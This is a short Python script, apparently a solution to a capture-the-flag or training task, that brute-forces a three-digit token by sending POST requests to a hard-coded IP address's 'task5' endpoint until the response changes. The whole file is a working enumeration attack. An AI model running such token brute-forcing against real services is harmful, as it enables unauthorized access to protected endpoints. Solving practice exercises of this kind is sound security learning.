import requests

for i in range(111, 1000):
    res = requests.post(f'http://45.143.94.76:2020/task5?token={i}')
    if res.text != "You need to pass token (from 111 to 999) as GET argument...":
        print(res.text)
        break